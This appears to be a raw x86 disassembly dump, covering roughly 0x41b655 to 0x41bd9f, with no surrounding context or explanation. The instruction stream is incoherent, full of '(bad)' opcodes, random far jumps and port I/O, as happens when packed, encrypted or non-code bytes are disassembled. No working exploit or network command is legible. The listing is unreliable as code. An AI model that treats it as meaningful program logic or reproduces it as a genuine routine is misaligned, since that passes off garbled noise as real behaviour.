  41b655:	repnz (bad) 
  41b657:	mov    edx,0x359de83f
  41b65c:	sbb    DWORD PTR [edi],0xe02a724f
  41b662:	mov    eax,ds:0x90bf7ea2
  41b667:	aad    0x78
  41b669:	push   ebp
  41b66a:	rol    DWORD PTR [ecx+0x5a19f795],0xbc
  41b671:	out    0xd,eax
  41b673:	dec    eax
  41b674:	cmp    DWORD PTR [esi-0x67589c28],ebx
  41b67a:	enter  0xf210,0x54
  41b67e:	pop    ebp
  41b67f:	mov    cr6,ecx
  41b682:	adc    eax,0x7840aa79
  41b687:	arpl   WORD PTR [edx-0x7b],dx
  41b68a:	push   0x88d7745d
  41b68f:	stc    
  41b690:	sub    cl,BYTE PTR [edx]
  41b692:	sbb    ebx,DWORD PTR [eax+0x47100467]
  41b698:	int    0x34
  41b69a:	mov    esp,0x2d1f857b
  41b69f:	mov    cl,0xd0
  41b6a1:	dec    eax
  41b6a2:	add    al,0x38
  41b6a4:	popf   
  41b6a5:	cmp    al,0x2d
  41b6a7:	jne    0x41b62e
  41b6a9:	pushf  
  41b6aa:	scas   eax,DWORD PTR es:[edi]
  41b6ab:	cli    
  41b6ac:	pop    ss
  41b6ad:	mov    ds:0xff33caf1,al
  41b6b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6b3:	ret    
  41b6b4:	jne    0x41b683
  41b6b6:	mov    eax,0x5f406818
  41b6bb:	outs   dx,DWORD PTR ds:[esi]
  41b6bc:	fmul   st,st(2)
  41b6be:	jns    0x41b6d4
  41b6c0:	lock (bad) 
  41b6c2:	nop
  41b6c3:	or     BYTE PTR [edx+0x7a],ch
  41b6c6:	jle    0x41b67b
  41b6c8:	cs inc ebx
  41b6ca:	ss sub al,0x4b
  41b6cd:	adc    esi,DWORD PTR [eax-0x59]
  41b6d0:	adc    DWORD PTR [edx+0x5d],ebx
  41b6d3:	adc    DWORD PTR [edi+0x46d22b6],0xbae96521
  41b6dd:	push   esp
  41b6de:	fstp   TBYTE PTR [esi+0x3d6cccc0]
  41b6e4:	mov    esp,0x29f1a72f
  41b6e9:	jbe    0x41b6bc
  41b6eb:	cld    
  41b6ec:	mov    ebx,0x131cd8b8
  41b6f1:	and    cl,BYTE PTR [ebx-0x5e]
  41b6f4:	jl     0x41b73a
  41b6f6:	push   ebx
  41b6f7:	mov    dh,0x28
  41b6f9:	cmp    edi,DWORD PTR [ebx-0x6a3e0026]
  41b6ff:	out    dx,al
  41b700:	sti    
  41b701:	jecxz  0x41b6b7
  41b703:	popf   
  41b704:	(bad)  
  41b705:	push   edx
  41b706:	mov    dl,0x10
  41b708:	push   ebp
  41b709:	and    edi,DWORD PTR [eax-0x7392428f]
  41b70f:	mov    dl,0x49
  41b711:	mov    fs,WORD PTR [esi-0x6d110b50]
  41b717:	mov    eax,0x5a19ad21
  41b71c:	gs push edi
  41b71e:	retf   0xc291
  41b721:	push   ss
  41b722:	xchg   ecx,eax
  41b723:	fcomp  QWORD PTR [edx+0x2]
  41b726:	push   es
  41b727:	test   al,0x96
  41b729:	repz cmp BYTE PTR [edi+ebp*1],al
  41b72d:	popa   
  41b72e:	pop    edx
  41b72f:	rcr    DWORD PTR [edx+edx*8+0x4a],1
  41b733:	std    
  41b734:	in     al,dx
  41b735:	ss dec esi
  41b737:	inc    ebx
  41b738:	(bad)  
  41b739:	mov    ch,0x95
  41b73b:	add    eax,0xda505fb5
  41b740:	inc    ebp
  41b741:	adc    al,0x4e
  41b743:	std    
  41b744:	bound  edi,QWORD PTR [esp+eiz*4-0x49]
  41b748:	fnstcw WORD PTR [esi]
  41b74a:	mov    ecx,0x41c6012a
  41b74f:	lea    edx,ds:0xdc992e22
  41b755:	mov    cl,0x8b
  41b757:	mov    esp,0x2c531d32
  41b75c:	mov    edx,esi
  41b75e:	daa    
  41b75f:	pop    edi
  41b760:	test   al,0x13
  41b762:	lds    eax,FWORD PTR [eax-0x2f]
  41b765:	into   
  41b766:	xor    dh,dl
  41b768:	push   cs
  41b769:	div    eax
  41b76b:	push   cs
  41b76c:	cmp    DWORD PTR [esi],edx
  41b76e:	mov    ecx,0xc5f8c158
  41b773:	dec    ecx
  41b774:	inc    esp
  41b775:	sub    DWORD PTR es:[esi+0x3],esi
  41b779:	xchg   edx,eax
  41b77a:	jmp    0xac22:0xbc27978b
  41b781:	or     ch,BYTE PTR [ebx-0x48]
  41b784:	dec    ebx
  41b785:	iret   
  41b786:	xchg   esp,eax
  41b787:	jmp    0xe8b36876
  41b78c:	xor    ecx,DWORD PTR [edx]
  41b78e:	ret    0x746c
  41b791:	jmp    0x41b77c
  41b793:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b794:	cmp    bh,BYTE PTR [ebx+0x6c]
  41b797:	adc    esp,ebx
  41b799:	test   BYTE PTR [ebx+edx*4-0x2c],0xa6
  41b79e:	ins    DWORD PTR es:[edi],dx
  41b79f:	dec    edi
  41b7a0:	inc    esp
  41b7a1:	es clc 
  41b7a3:	sahf   
  41b7a4:	cmp    DWORD PTR [ebp-0xf],ebx
  41b7a7:	adc    ah,BYTE PTR [ebx-0xa76d339]
  41b7ad:	mov    cl,0xca
  41b7af:	xchg   ebp,eax
  41b7b0:	pop    esp
  41b7b1:	push   ebp
  41b7b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7b3:	out    dx,al
  41b7b4:	mov    ch,0xf4
  41b7b6:	jp     0x41b78f
  41b7b8:	sub    BYTE PTR [eax+0x1d9c4304],dl
  41b7be:	jo     0x41b791
  41b7c0:	std    
  41b7c1:	push   edi
  41b7c2:	cld    
  41b7c3:	in     eax,dx
  41b7c4:	cmp    DWORD PTR [ecx+eax*1],0x74
  41b7c8:	lds    esp,FWORD PTR [eax+0x2e6b29ac]
  41b7ce:	inc    edx
  41b7cf:	fwait
  41b7d0:	pop    esp
  41b7d1:	mov    ch,0x32
  41b7d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7d4:	jo     0x41b7b4
  41b7d6:	sar    DWORD PTR [ecx+0xc878e14],1
  41b7dc:	aad    0x6e
  41b7de:	sbb    edx,DWORD PTR [esi]
  41b7e0:	or     DWORD PTR [edi+0x428e8a45],edx
  41b7e6:	fsubr  QWORD PTR [ebx-0x845a490]
  41b7ec:	gs fwait
  41b7ee:	arpl   WORD PTR [eax],bp
  41b7f0:	xchg   ecx,eax
  41b7f1:	fcom   DWORD PTR [eax+0x24568673]
  41b7f7:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7f9:	jb     0x41b77d
  41b7fb:	scas   eax,DWORD PTR es:[edi]
  41b7fc:	sub    esi,DWORD PTR [edx+0x8922250]
  41b802:	(bad)  
  41b803:	es in  al,0x1a
  41b806:	xchg   ecx,eax
  41b807:	lds    eax,FWORD PTR [ecx+0x3d]
  41b80a:	jno    0x41b7b2
  41b80c:	fxtract 
  41b80e:	jbe    0x41b81a
  41b810:	add    edi,ebx
  41b812:	jle    0x41b7ef
  41b814:	inc    esi
  41b815:	mov    ebp,0xdad3862d
  41b81a:	retf   
  41b81b:	outs   dx,BYTE PTR ds:[esi]
  41b81c:	xlat   BYTE PTR ds:[ebx]
  41b81d:	out    0xa5,eax
  41b81f:	sub    ebx,DWORD PTR [eax-0x333cd6c4]
  41b825:	shr    ch,0x6
  41b828:	cmp    cl,bh
  41b82a:	rcl    edx,1
  41b82c:	cwde   
  41b82d:	inc    ecx
  41b82e:	leave  
  41b82f:	jns    0x41b891
  41b831:	mov    ebp,0xdea11e10
  41b836:	je     0x41b89d
  41b838:	push   ebp
  41b839:	dec    ecx
  41b83a:	nop
  41b83b:	sub    bl,BYTE PTR [ebx+0x1f]
  41b83e:	push   ecx
  41b83f:	ja     0x41b857
  41b841:	cld    
  41b842:	addr16 sbb eax,0x7864ce1f
  41b848:	sub    eax,0x23e6f70b
  41b84d:	jne    0x41b801
  41b84f:	jne    0x41b8bd
  41b851:	test   al,0x99
  41b853:	shl    BYTE PTR [ebp+0x2501a447],1
  41b859:	or     ch,cl
  41b85b:	popf   
  41b85c:	(bad)  
  41b85d:	outs   dx,BYTE PTR ds:[esi]
  41b85e:	sbb    DWORD PTR ds:0x32d8cc68,edi
  41b864:	inc    ebp
  41b865:	and    BYTE PTR ds:0x8d3df82,bh
  41b86b:	jae    0x41b814
  41b86d:	adc    ebp,ecx
  41b86f:	(bad)  
  41b870:	jo     0x41b8c2
  41b872:	retf   0x407b
  41b875:	lds    edx,FWORD PTR [edi+0x12d0069d]
  41b87b:	in     al,0x6b
  41b87d:	jne    0x41b860
  41b87f:	jns    0x41b820
  41b881:	gs pusha 
  41b883:	enter  0xf4b4,0x6c
  41b887:	jo     0x41b8cc
  41b889:	scas   eax,DWORD PTR es:[edi]
  41b88a:	xor    ch,BYTE PTR [esi]
  41b88c:	fnstsw WORD PTR [eax-0x5f]
  41b88f:	pop    ebx
  41b890:	or     eax,0xc3c118e
  41b895:	adc    bh,al
  41b897:	or     bl,BYTE PTR [edx-0x2f]
  41b89a:	fs sti 
  41b89c:	in     al,0xb4
  41b89e:	mov    eax,0x82543ad2
  41b8a3:	add    eax,0x2c182f8c
  41b8a8:	(bad)  
  41b8a9:	jae    0x41b830
  41b8ab:	adc    DWORD PTR [ecx],edi
  41b8ad:	sub    BYTE PTR [edi],0xbf
  41b8b0:	add    eax,DWORD PTR [ecx-0x6a]
  41b8b3:	(bad)  [esi]
  41b8b5:	xchg   esi,eax
  41b8b6:	push   edi
  41b8b7:	bound  edx,QWORD PTR [eax+0x6]
  41b8ba:	sub    eax,0x392d6fab
  41b8bf:	push   0xffffffe9
  41b8c1:	cmp    BYTE PTR [ebp+eiz*1+0x6dba5916],bh
  41b8c8:	sbb    al,0x64
  41b8ca:	stos   DWORD PTR es:[edi],eax
  41b8cb:	push   ss
  41b8cc:	mov    ds:0x191d6409,eax
  41b8d1:	aas    
  41b8d2:	adc    al,0x55
  41b8d4:	adc    DWORD PTR [ebp+0x11],0x19
  41b8d8:	pop    ecx
  41b8d9:	pop    esp
  41b8da:	pop    ecx
  41b8db:	rcr    DWORD PTR [edx],1
  41b8dd:	out    dx,al
  41b8de:	and    eax,0x848d13d
  41b8e3:	sbb    al,0xf2
  41b8e5:	retf   0x2b66
  41b8e8:	lahf   
  41b8e9:	xor    eax,0xb3663d9f
  41b8ee:	mov    edi,0x471f4cb6
  41b8f3:	bswap  edi
  41b8f5:	ja     0x41b8c1
  41b8f7:	hlt    
  41b8f8:	shl    BYTE PTR [ecx+0x21],0xf2
  41b8fc:	leave  
  41b8fd:	les    eax,FWORD PTR [ebx]
  41b8ff:	scas   al,BYTE PTR es:[edi]
  41b900:	and    al,0x37
  41b902:	in     al,0xd3
  41b904:	rol    BYTE PTR [ecx-0xbf95b46],cl
  41b90a:	shl    DWORD PTR ds:0x522127cc,cl
  41b910:	adc    BYTE PTR [esi+ecx*4-0x6244b896],dh
  41b917:	call   0x33f4b05
  41b91c:	sub    eax,0xb0dec3a9
  41b921:	mov    dl,0xe3
  41b923:	data16 jge 0x41b98c
  41b926:	test   DWORD PTR [edx-0x4a],ebx
  41b929:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b92a:	aad    0x5e
  41b92c:	repnz les ebx,FWORD PTR [ecx-0x2c]
  41b930:	aad    0x33
  41b932:	iret   
  41b933:	mov    esi,0xca272c22
  41b938:	(bad)  
  41b939:	or     ebp,DWORD PTR [edx+0x52]
  41b93c:	ins    BYTE PTR es:[edi],dx
  41b93d:	outs   dx,DWORD PTR ds:[esi]
  41b93e:	push   edi
  41b93f:	jne    0x41b8c8
  41b941:	fstp   DWORD PTR [edx-0x6b]
  41b944:	(bad)  
  41b945:	sub    bh,BYTE PTR [esi+0x19]
  41b948:	or     edi,DWORD PTR [ecx]
  41b94a:	mov    ds:0x85fedbf8,eax
  41b94f:	sbb    eax,0x87836f50
  41b954:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b955:	lods   eax,DWORD PTR ds:[esi]
  41b956:	cwde   
  41b957:	addr16 cmp al,0xa9
  41b95a:	mov    eax,ds:0xa461b5f0
  41b95f:	mov    ah,0xe
  41b961:	shl    DWORD PTR ds:0x7b04ff9c,1
  41b967:	pushf  
  41b968:	icebp  
  41b969:	in     eax,0xb2
  41b96b:	cmp    eax,0x1b50f3da
  41b970:	fucomp st(3)
  41b972:	sbb    edi,DWORD PTR [edi+0x2f793c37]
  41b978:	or     al,0x6f
  41b97a:	fwait
  41b97b:	out    0xd2,al
  41b97d:	jns    0x41b956
  41b97f:	jmp    0xb709:0xd18e3b43
  41b986:	jge    0x41b9b5
  41b988:	test   al,0xe4
  41b98a:	and    eax,0x7d7ab1b6
  41b98f:	sub    eax,0x533d4f7b
  41b994:	ss inc esp
  41b996:	aas    
  41b997:	(bad)  
  41b998:	dec    eax
  41b999:	out    dx,eax
  41b99a:	xchg   ebp,eax
  41b99b:	pop    esi
  41b99c:	shl    BYTE PTR [edx-0x5d7b7908],1
  41b9a2:	pop    ss
  41b9a3:	mov    ah,0xf0
  41b9a5:	jecxz  0x41b94b
  41b9a7:	inc    esp
  41b9a8:	dec    edx
  41b9a9:	xlat   BYTE PTR ds:[ebx]
  41b9aa:	add    dl,bh
  41b9ac:	pop    ss
  41b9ad:	cmc    
  41b9ae:	imul   edx,DWORD PTR [ebp-0x5],0xffffff9c
  41b9b2:	xchg   esp,eax
  41b9b3:	sbb    al,0x13
  41b9b5:	mov    cl,0xda
  41b9b7:	(bad)  
  41b9b8:	mov    dh,0xd0
  41b9ba:	cdq    
  41b9bb:	lock xor eax,0x37463ce0
  41b9c1:	jl     0x41ba05
  41b9c3:	popf   
  41b9c4:	cmp    al,BYTE PTR [ebp+0x6fa84189]
  41b9ca:	call   0xa551:0x78441952
  41b9d1:	cmp    ah,dh
  41b9d3:	mov    ch,0x9
  41b9d5:	(bad)
  41b9d8:	pop    esi
  41b9d9:	fisubr DWORD PTR [edi-0x17]
  41b9dc:	pop    esi
  41b9dd:	jge    0x41b9d2
  41b9df:	push   cs
  41b9e0:	imul   edx,DWORD PTR [ebp+0x2ab098c3],0xffffffcd
  41b9e7:	out    dx,al
  41b9e8:	cld    
  41b9e9:	dec    esi
  41b9ea:	sub    al,0x86
  41b9ec:	mov    ecx,0x15a29d6f
  41b9f1:	daa    
  41b9f2:	pop    esi
  41b9f3:	test   BYTE PTR [ebx-0x38cd3787],0xdc
  41b9fa:	and    eax,0xb3996948
  41b9ff:	pop    ss
  41ba00:	adc    ebp,DWORD PTR ss:[ebx]
  41ba03:	jb     0x41b9c1
  41ba05:	fsubr  QWORD PTR [esi-0x6f]
  41ba08:	retf   
  41ba09:	addr16 fwait
  41ba0b:	xor    eax,0xe09c8172
  41ba10:	leave  
  41ba11:	mov    eax,0xe54859d
  41ba16:	das    
  41ba17:	mov    bl,0x50
  41ba19:	popa   
  41ba1a:	bound  ebx,QWORD PTR [esi]
  41ba1c:	retf   0x22c9
  41ba1f:	rcr    ecx,0x90
  41ba22:	jge    0x41b9e0
  41ba24:	arpl   WORD PTR [ebx-0x6dd051ac],dx
  41ba2a:	cmp    BYTE PTR [ebx+0x75b249c5],cl
  41ba30:	popf   
  41ba31:	out    dx,al
  41ba32:	pop    es
  41ba33:	mov    edx,0xab7fd67
  41ba38:	bound  ebx,QWORD PTR [eax+0x34]
  41ba3b:	sbb    BYTE PTR [edi],dh
  41ba3d:	inc    ebp
  41ba3e:	(bad)  
  41ba3f:	adc    edi,DWORD PTR [edx]
  41ba41:	add    eax,0x7c4426b0
  41ba46:	imul   ecx,DWORD PTR [edx+0x5f20b365],0xcec7d090
  41ba50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba51:	in     al,0xb8
  41ba53:	mov    ds:0xcf267885,al
  41ba58:	mov    BYTE PTR [esi],dh
  41ba5a:	mov    bh,BYTE PTR gs:[ebp+0x5d]
  41ba5e:	xor    DWORD PTR [ecx],ebx
  41ba60:	pop    edx
  41ba61:	and    eax,DWORD PTR [ebx+0x17ff3074]
  41ba67:	das    
  41ba68:	sub    BYTE PTR [esi+ebx*8+0x43e3b9fa],bh
  41ba6f:	jecxz  0x41baea
  41ba71:	dec    edx
  41ba72:	or     ecx,esi
  41ba74:	jo     0x41ba83
  41ba76:	sub    bx,bx
  41ba79:	in     eax,0x4e
  41ba7b:	leave  
  41ba7c:	arpl   WORD PTR [esi+0x59c38fac],dx
  41ba82:	push   0x77
  41ba84:	push   ecx
  41ba85:	dec    edi
  41ba86:	adc    dh,0xa4
  41ba89:	add    BYTE PTR [ecx+0x1986ec04],al
  41ba8f:	in     eax,0xe6
  41ba91:	lods   eax,DWORD PTR ds:[esi]
  41ba92:	xor    al,0x2
  41ba94:	sub    al,0x91
  41ba96:	jle    0x41bada
  41ba98:	(bad)  
  41ba99:	nop
  41ba9a:	test   eax,0xb04660e9
  41ba9f:	mov    edi,0x3663de24
  41baa4:	mov    ch,BYTE PTR [ebp-0x17]
  41baa7:	pusha  
  41baa8:	dec    eax
  41baa9:	popf   
  41baaa:	call   0xf5f8:0xd4b82e3e
  41bab1:	mov    ds:0x558e6e7e,eax
  41bab6:	icebp  
  41bab7:	enter  0x5502,0x3c
  41babb:	xchg   ah,ch
  41babd:	dec    ebp
  41babe:	rcr    BYTE PTR [esi],cl
  41bac0:	aam    0xbf
  41bac2:	add    BYTE PTR [ebp-0x2c687779],ah
  41bac8:	scas   al,BYTE PTR es:[edi]
  41bac9:	xchg   ebp,eax
  41baca:	shl    dl,0x62
  41bacd:	mov    al,0x2d
  41bacf:	add    eax,0xd692c6c7
  41bad4:	jecxz  0x41ba5a
  41bad6:	das    
  41bad7:	fldcw  WORD PTR [ecx]
  41bad9:	lahf   
  41bada:	shr    DWORD PTR [eax+0x5fc1c8ac],cl
  41bae0:	arpl   WORD PTR [esi+0x35],bp
  41bae3:	lea    esi,[ecx]
  41bae5:	leave  
  41bae6:	jl     0x41bade
  41bae8:	sub    al,0x12
  41baea:	xchg   esp,eax
  41baec:	daa    
  41baed:	inc    ecx
  41baee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41baef:	fstp   DWORD PTR [ebx-0x6a365e07]
  41baf5:	gs mov dh,0x7f
  41baf8:	call   0xb878ae4b
  41bafd:	inc    eax
  41bafe:	leave  
  41baff:	and    DWORD PTR [eax],ecx
  41bb01:	or     bl,BYTE PTR [eax-0x385799c]
  41bb07:	mov    bh,0x85
  41bb09:	sub    bh,dl
  41bb0b:	aaa    
  41bb0c:	jae    0x41bab5
  41bb0e:	pushf  
  41bb0f:	inc    ecx
  41bb10:	addr16 cdq 
  41bb12:	lods   eax,DWORD PTR ds:[esi]
  41bb13:	cli    
  41bb14:	(bad)  
  41bb15:	daa    
  41bb16:	les    edi,FWORD PTR [edx+ebp*4]
  41bb19:	ffreep st(2)
  41bb1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb1c:	fcom   st(1)
  41bb1e:	les    edi,FWORD PTR [ebx+ecx*2-0x5469bcb1]
  41bb25:	nop
  41bb26:	retf   
  41bb27:	mov    ebp,0xf8608e3f
  41bb2c:	cmp    ah,dl
  41bb2e:	and    ch,al
  41bb30:	sub    bl,BYTE PTR [edx-0x36caa80a]
  41bb36:	fiadd  DWORD PTR ds:0x23297cda
  41bb3c:	shl    DWORD PTR [esi-0x5e4055ad],0x9c
  41bb43:	mov    dh,0xba
  41bb45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb46:	aad    0x67
  41bb48:	loop   0x41bbb4
  41bb4a:	push   esp
  41bb4b:	pop    edi
  41bb4c:	aam    0x51
  41bb4e:	inc    edi
  41bb4f:	pop    esp
  41bb50:	retf   
  41bb51:	jp     0x41bb25
  41bb53:	jb     0x41bb6c
  41bb55:	sub    edx,ebx
  41bb57:	cld    
  41bb58:	mov    esi,0x39926a45
  41bb5d:	retf   
  41bb5e:	xor    al,0x50
  41bb60:	into   
  41bb61:	jecxz  0x41bb33
  41bb63:	(bad)  
  41bb64:	mov    DWORD PTR [esi-0x36],eax
  41bb67:	scas   al,BYTE PTR es:[edi]
  41bb68:	outs   dx,DWORD PTR ds:[esi]
  41bb69:	es jge 0x41bb6e
  41bb6c:	inc    ebx
  41bb6d:	dec    esi
  41bb6e:	loope  0x41bb4d
  41bb70:	jnp    0x41bb4a
  41bb72:	jae    0x41bb68
  41bb74:	test   BYTE PTR [edx-0x76e08731],al
  41bb7a:	mov    al,ds:0x220ba3ff
  41bb7f:	scas   eax,DWORD PTR es:[edi]
  41bb80:	loop   0x41bb7e
  41bb82:	jecxz  0x41bb30
  41bb84:	mov    ah,BYTE PTR [esi+0x4d71b709]
  41bb8a:	or     ebx,DWORD PTR [eax+ecx*8-0x4a1d4618]
  41bb91:	pushf  
  41bb92:	dec    ebp
  41bb93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb95:	ins    BYTE PTR es:[edi],dx
  41bb96:	push   eax
  41bb97:	xor    al,0x38
  41bb99:	loopne 0x41bbf4
  41bb9b:	dec    edi
  41bb9c:	mov    bh,0x90
  41bb9e:	or     eax,0x7e2623c9
  41bba3:	mov    ds:0x2a78428e,al
  41bba8:	mov    edx,0xda65a5aa
  41bbad:	js     0x41bbef
  41bbaf:	push   edi
  41bbb0:	xchg   ecx,eax
  41bbb1:	ins    DWORD PTR es:[edi],dx
  41bbb2:	popa   
  41bbb3:	inc    edi
  41bbb4:	fldenv [esi-0x3f1394dd]
  41bbba:	mov    esp,DWORD PTR [edi+0x40]
  41bbbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbbe:	(bad)  
  41bbbf:	mov    ch,0xb7
  41bbc1:	loope  0x41bc07
  41bbc3:	sub    eax,eax
  41bbc5:	enter  0xfe80,0x5f
  41bbc9:	in     eax,dx
  41bbca:	inc    esi
  41bbcb:	mov    al,0x6f
  41bbcd:	data16 and al,BYTE PTR [edi+0x1adf728a]
  41bbd4:	stos   BYTE PTR es:[edi],al
  41bbd5:	add    DWORD PTR [ebp-0x40],0xffffffdf
  41bbd9:	and    al,BYTE PTR ds:0x388ceadf
  41bbdf:	mov    ds:0x7c99838,eax
  41bbe4:	pop    ebp
  41bbe5:	jmp    0xf4d847ef
  41bbea:	dec    ebp
  41bbeb:	shl    al,cl
  41bbed:	cmp    DWORD PTR [eax],ebx
  41bbef:	adc    ebx,DWORD PTR [edx+0x32]
  41bbf2:	js     0x41bb8c
  41bbf4:	jg     0x41bb9a
  41bbf6:	shl    BYTE PTR [ebp-0x7ed1fbd6],0x40
  41bbfd:	xor    BYTE PTR [esi],0x29
  41bc00:	xchg   edi,eax
  41bc01:	add    BYTE PTR gs:[eax-0x2c],dh
  41bc05:	inc    edi
  41bc06:	xchg   ecx,eax
  41bc07:	clc    
  41bc08:	icebp  
  41bc09:	popf   
  41bc0a:	test   al,0x2d
  41bc0c:	std    
  41bc0d:	popa   
  41bc0e:	jbe    0x41bbac
  41bc10:	cs pop ss
  41bc12:	mov    dh,BYTE PTR [edx-0x72c3d574]
  41bc18:	pop    ecx
  41bc19:	mov    ebp,edi
  41bc1b:	lea    ebx,[ecx]
  41bc1d:	inc    ebp
  41bc1e:	nop
  41bc1f:	nop
  41bc20:	lods   eax,DWORD PTR ds:[esi]
  41bc21:	lods   eax,DWORD PTR ds:[esi]
  41bc22:	out    0xd0,al
  41bc24:	lock xchg DWORD PTR [edi+0x2a770b8b],ebp
  41bc2b:	sub    ecx,DWORD PTR [eax-0x76927431]
  41bc31:	pop    edx
  41bc32:	ja     0x41bbc9
  41bc34:	dec    esp
  41bc35:	xor    DWORD PTR [ecx],eax
  41bc37:	pop    ecx
  41bc38:	cmp    eax,0xa495ff64
  41bc3d:	inc    edi
  41bc3e:	jecxz  0x41bc02
  41bc40:	addr16 mov ch,0x4b
  41bc43:	sahf   
  41bc44:	xor    al,0xd
  41bc46:	popa   
  41bc47:	and    eax,0x9466f6fb
  41bc4c:	nop
  41bc4d:	test   BYTE PTR [eax+0x124b57f7],0xcb
  41bc54:	jecxz  0x41bc78
  41bc56:	push   esp
  41bc57:	jl     0x41bc71
  41bc59:	fwait
  41bc5a:	mov    edi,0x6cafca89
  41bc5f:	mov    dl,0xaf
  41bc61:	das    
  41bc62:	push   eax
  41bc63:	sub    al,0xd1
  41bc65:	std    
  41bc66:	dec    ebp
  41bc67:	ror    BYTE PTR [edi],0x30
  41bc6a:	mov    WORD PTR [edi],ss
  41bc6c:	cwde   
  41bc6d:	nop
  41bc6e:	xlat   BYTE PTR ds:[ebx]
  41bc6f:	dec    edx
  41bc70:	inc    edi
  41bc71:	and    eax,ebx
  41bc73:	pop    ss
  41bc74:	imul   ebp,edx,0xc86fbe88
  41bc7a:	mov    ds:0x866a6425,eax
  41bc7f:	fsubr  DWORD PTR [ebx+0x19]
  41bc82:	jbe    0x41bcb4
  41bc84:	enter  0x3132,0x35
  41bc88:	xor    DWORD PTR [ebp+esi*4+0x43],eax
  41bc8c:	repz repz imul DWORD PTR [esi-0x6f]
  41bc91:	cmc    
  41bc92:	mov    ecx,0x235b87a0
  41bc97:	dec    edi
  41bc98:	dec    edx
  41bc99:	xchg   esi,eax
  41bc9a:	add    dl,al
  41bc9c:	dec    ebx
  41bc9d:	popa   
  41bc9e:	fs jb  0x41bcd7
  41bca1:	idiv   BYTE PTR gs:[edx+0x2aac3497]
  41bca8:	push   ecx
  41bca9:	lahf   
  41bcaa:	xchg   esi,eax
  41bcab:	ss mov ah,0x6d
  41bcae:	mov    ebp,DWORD PTR [esi]
  41bcb0:	popf   
  41bcb1:	out    0x8d,al
  41bcb3:	cdq    
  41bcb4:	adc    DWORD PTR [ebx+edi*1+0x4c514f6a],ebp
  41bcbb:	mov    ?,ecx
  41bcbd:	jl     0x41bcb0
  41bcbf:	adc    dl,BYTE PTR [edx]
  41bcc1:	pop    ebp
  41bcc2:	pop    esi
  41bcc3:	pusha  
  41bcc4:	xor    bh,al
  41bcc6:	sbb    DWORD PTR [ebx+esi*4],eax
  41bcc9:	cld    
  41bcca:	inc    edi
  41bccb:	push   edx
  41bccc:	dec    ecx
  41bccd:	mov    WORD PTR [edi+0x6542415a],gs
  41bcd3:	gs pop esp
  41bcd5:	out    dx,al
  41bcd6:	dec    edx
  41bcd7:	push   eax
  41bcd8:	test   DWORD PTR [eax],ebp
  41bcda:	xor    al,0xd2
  41bcdc:	fcmovb st,st(0)
  41bcde:	sar    DWORD PTR [edi-0x38efaa01],1
  41bce4:	test   eax,0x3991d8aa
  41bce9:	ins    DWORD PTR es:[edi],dx
  41bcea:	out    0xd2,al
  41bcec:	std    
  41bced:	mov    cl,0x83
  41bcef:	mov    al,bl
  41bcf1:	inc    esp
  41bcf2:	adc    dl,ah
  41bcf4:	jnp    0x41bd4f
  41bcf6:	imul   esi,DWORD PTR [edx],0x13
  41bcf9:	(bad)  
  41bcfa:	push   esi
  41bcfb:	push   ebp
  41bcfc:	or     eax,0x652cfa96
  41bd01:	popa   
  41bd02:	out    0x25,al
  41bd04:	loope  0x41bd85
  41bd06:	outs   dx,BYTE PTR ds:[esi]
  41bd07:	or     al,0x7c
  41bd09:	xchg   ecx,eax
  41bd0a:	fmul   DWORD PTR [eax-0x2b]
  41bd0d:	sbb    eax,0xfee5267c
  41bd12:	xchg   esp,eax
  41bd13:	in     eax,dx
  41bd14:	jp     0x41bcea
  41bd16:	xor    eax,0x892c4acf
  41bd1b:	mul    BYTE PTR [edi-0x73db5e18]
  41bd21:	mov    ecx,0x89150f89
  41bd26:	mov    edi,0xbca3a0d2
  41bd2b:	dec    BYTE PTR [ebp+0x45]
  41bd2e:	or     al,0x62
  41bd30:	add    DWORD PTR [edx*4+0x4a53d4c],esp
  41bd37:	test   DWORD PTR [ecx+0xb],0x8aaeb968
  41bd3e:	pop    edi
  41bd3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd40:	daa    
  41bd41:	adc    eax,DWORD PTR [ebx-0x7709df2c]
  41bd47:	and    al,0x4a
  41bd49:	test   al,0x42
  41bd4b:	stos   BYTE PTR es:[edi],al
  41bd4c:	scas   eax,DWORD PTR es:[edi]
  41bd4d:	arpl   WORD PTR [ebx-0x4f],si
  41bd50:	jns    0x41bd94
  41bd52:	dec    ecx
  41bd53:	cmc    
  41bd54:	aaa    
  41bd55:	shl    BYTE PTR [esi-0x60],1
  41bd58:	xor    bl,bh
  41bd5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd5b:	jmp    0x92da61dc
  41bd60:	test   ah,bh
  41bd62:	sbb    DWORD PTR [ebp-0x39],ecx
  41bd65:	xchg   edx,eax
  41bd66:	cmp    DWORD PTR [esi],edi
  41bd68:	aam    0xae
  41bd6a:	hlt    
  41bd6b:	out    dx,eax
  41bd6c:	xor    eax,DWORD PTR [eax+0x79]
  41bd6f:	aam    0x1
  41bd71:	inc    ecx
  41bd72:	dec    ebx
  41bd73:	les    esp,FWORD PTR [eax-0x4a4422c]
  41bd79:	das    
  41bd7a:	and    BYTE PTR [edx+0x5057f242],ah
  41bd80:	jno    0x41bd07
  41bd82:	sub    esi,DWORD PTR [ecx+0x3d]
  41bd85:	lock xchg edi,eax
  41bd87:	push   ecx
  41bd88:	(bad)  
  41bd89:	call   0x4bec650f
  41bd8e:	int3   
  41bd8f:	xchg   ebx,eax
  41bd90:	fidiv  WORD PTR [edi]
  41bd92:	jb     0x41bd9d
  41bd94:	fst    QWORD PTR [edi+0x34]
  41bd97:	lds    edi,FWORD PTR [edx]
  41bd99:	call   0x2250a5c4
  41bd9e:	cli    
  41bd9f:	ret    0x6aea
